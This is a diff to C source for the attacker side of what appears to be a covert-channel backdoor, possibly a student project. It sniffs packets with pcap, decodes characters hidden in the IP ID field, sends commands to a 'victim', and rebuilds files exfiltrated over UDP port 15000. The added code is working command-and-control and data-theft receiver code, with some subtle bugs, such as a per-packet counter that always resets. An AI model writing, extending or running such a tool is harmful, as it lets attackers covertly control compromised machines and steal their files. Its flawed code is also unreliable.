@@ -47,7 +47,7 @@ int main(void) {
         fprintf(stderr,"Error setting filter\n");
         exit(1);
     }
-    pcap_loop(nic_fd, DEFAULT_COUNT, pkt_callback, args);
+    pcap_loop(nic_fd, PACKET_COUNT, pkt_callback, args);
     return EXIT_SUCCESS;
 }
 
@@ -137,9 +137,9 @@ void* input_select_call(void* arg) {
                     puts("============ RESULT ============");
                     if (fgets(opts->victim_instruction, sizeof(opts->victim_instruction), stdin)) {
                         opts->victim_instruction[strlen(opts->victim_instruction) - 1] = 0;
-                        if (strstr(opts->victim_instruction, "target") != NULL ) {
+                        if (strstr(opts->victim_instruction, "target") != NULL )
                             strcpy(opts->target_directory, opts->victim_instruction + 7);
-                        }
+
                         sprintf(instruction, "[[%s]]", opts->victim_instruction);
                         length = strlen(instruction);
                         for (int j = 0; j < length; j++) {
@@ -179,11 +179,72 @@ void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* 
 void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
     struct ether_header* ether;
     struct iphdr *ip;
+    struct udphdr *udp;
+    char temp[2] = {0};
+    char c;
+    int s = 0;
+
+    struct options_attacker *opts = (struct options_attacker*)args;
 
     ether = (struct ether_header*)(packet);
     ip = (struct iphdr*)(((char*) ether) + sizeof(struct ether_header));
+    udp = (struct udphdr*)(((char*) ip) + sizeof(struct iphdr));
+    c = (char)hide_data(ntohs(ip->id));
 
-    setvbuf(stdout, NULL, _IONBF, 0);
-    setvbuf(stderr, NULL, _IONBF, 0);
-    printf("%c", (char)hide_data(ntohs(ip->id)));
+    if (udp->uh_dport == ntohs(15000)) {
+        if (opts->file_flag == FALSE) {
+            temp[0] = c;
+            temp[1] = '\0';
+            strcat(opts->file_info, temp);
+            if (strstr(opts->file_info, "]end") != NULL) {
+                opts->file_flag = TRUE;
+                tokenize_file_info(opts);
+            }
+        }
+        if (opts->file_flag == TRUE) {
+            create_file(opts, c);
+            s++;
+            if (s == opts->file_size) {
+                printf("Successfully download file");
+            }
+        }
+    }
+    else {
+        setvbuf(stdout, NULL, _IONBF, 0);
+        setvbuf(stderr, NULL, _IONBF, 0);
+        printf("%c", c);
+    }
+}
+
+
+void tokenize_file_info(struct options_attacker *opts) {
+    char *start = strchr(opts->file_info, '[');
+    char *file_name;
+    char *token;
+    if (start != NULL) {
+        file_name = strtok(start + 1, " ");
+        if (file_name != NULL) {
+            strcpy(opts->file_name, file_name);
+            token = strtok(NULL, " ");
+            if (token != NULL && strcmp(token, "size:") == 0) {
+                // Extract size
+                token = strtok(NULL, "[");
+                if(token != NULL) {
+                    opts->file_size = atoi(token);
+                }
+            }
+        }
+    }
+}
+
+
+void create_file(struct options_attacker *opts, char c) {
+    FILE *fp = fopen(opts->file_name, "ab");
+
+    if(fp == NULL) {
+        perror("create_file() - Failed to open file");
+    }
+    // Write the hex value to the file
+    fwrite(&c, sizeof(char), 1, fp);
+    fclose(fp);
 }
